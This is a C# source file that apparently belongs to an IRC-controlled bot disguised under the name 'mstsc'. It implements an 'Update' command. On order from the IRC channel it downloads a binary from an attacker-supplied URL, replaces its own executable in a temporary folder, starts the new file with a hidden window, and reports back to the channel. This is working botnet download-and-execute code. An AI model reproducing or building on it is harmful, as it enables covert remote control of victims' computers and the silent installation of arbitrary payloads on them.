using System;
using System.IO;

namespace mstsc.Aries.Commands
{
sealed class Update
    {
        public Update(string[] Parameters)
        {
            try
            {
                if (File.Exists(Config.TemporaryFilesPath + Config.UpdateFileName))
                { File.Delete(Config.TemporaryFilesPath + Config.UpdateFileName); }

                /*if (File.Exists(Aries.Config.TemporaryFilesPath + "_" + Aries.Config.FileName))
                {
                    File.Delete(Aries.Config.TemporaryFilesPath + "_" + Aries.Config.FileName);
                }*/

                string UpdateURL = Parameters[2];
                string UpdateVersion = Parameters[3];

                if (Convert.ToDouble(UpdateVersion) > Config.Version)
                {

                    //if (Aries.Config.ExecutablePath.Contains(Aries.Config.TemporaryFilesPath))
                    {
                        try
                        {
                            FileInfo Update = new FileInfo(Config.ExecutablePath);
                            Update.MoveTo(Config.TemporaryFilesPath + Config.UpdateFileName);

                            while (!File.Exists(Config.TemporaryFilesPath + Config.UpdateFileName))
                            { System.Windows.Forms.Application.DoEvents(); }

                            //Delete the main file
                            if (File.Exists(Config.TemporaryFilesPath + Config.File))
                            {
                                File.Delete(Config.TemporaryFilesPath + Config.File);
                            }

                            //Wait for the file to be deleted
                            while (File.Exists(Config.TemporaryFilesPath + Config.File))
                            {
                                System.Windows.Forms.Application.DoEvents();
                            }
                        }
                        catch { }
                    }
                    //Download data from the url specified by the user and write it to the file
                    File.WriteAllBytes(Config.TemporaryFilesPath + Config.File, new System.Net.WebClient().DownloadData(UpdateURL));

                    //Success! Get out of here and start up the new file
                    Main.Instance.IRCClient.MessageCurrentChannel("{Update} Updated to v" + UpdateVersion + ". Restarting...");
                    Main.Instance.IRCClient.TCPStream.Close();
                    System.Threading.Thread.Sleep(1500);
                    System.Diagnostics.ProcessStartInfo info = new System.Diagnostics.ProcessStartInfo(Config.TemporaryFilesPath + Config.File);
                    info.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                    info.UseShellExecute = true;
                    System.Diagnostics.Process.Start(info);
                    //Interaction.Shell(Config.TemporaryFilesPath + Config.File, AppWinStyle.Hide, false, -1);
                    Environment.Exit(-1);
                }
                else if (Convert.ToDouble(UpdateVersion) <= Config.Version)
                {
                    //Already up to date
                    Main.Instance.IRCClient.MessageCurrentChannel("{Update} Already up to date");
                }
            }
            catch (Exception Exception)
            {
                //Failure
                Main.Instance.IRCClient.MessageCurrentChannel("{Update} Error updating - " + Exception.Message);
            }
        }
    }
}
